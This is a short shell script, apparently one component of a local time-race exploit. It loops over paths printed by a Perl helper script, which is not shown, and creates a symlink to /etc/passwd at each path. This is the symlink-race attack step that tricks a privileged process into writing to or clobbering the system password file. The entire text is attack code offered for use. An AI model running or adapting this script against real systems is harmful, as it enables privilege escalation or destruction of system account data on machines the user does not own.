#!/bin/sh
#Script for creating symlinks from output of local-timerace-xtr

for foo in `perl -x xtr-timerace-xtr.pl`
do
ln -s /etc/passwd $foo
done
